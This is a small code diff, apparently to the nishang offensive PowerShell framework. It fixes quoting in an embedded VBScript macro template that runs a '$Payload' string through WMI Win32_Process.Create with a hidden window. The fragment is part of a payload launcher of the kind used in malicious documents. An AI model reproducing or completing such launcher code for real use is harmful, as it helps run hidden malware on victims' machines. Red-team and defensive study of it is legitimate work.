@@ -4589,7 +4589,7 @@ https://github.com/samratashok/nishang
             Set objConfig = objStartup.SpawnInstance_
             objConfig.ShowWindow = HIDDEN_WINDOW
             Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create '$Payload', Null, objConfig, intProcessID
+            objProcess.Create "$Payload", Null, objConfig, intProcessID
          End Function
 "@
 
@@ -4609,7 +4609,7 @@ https://github.com/samratashok/nishang
             Set objConfig = objStartup.SpawnInstance_
             objConfig.ShowWindow = HIDDEN_WINDOW
             Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create '$Payload', Null, objConfig, intProcessID
+            objProcess.Create "$Payload", Null, objConfig, intProcessID
          End Function
 "@
 
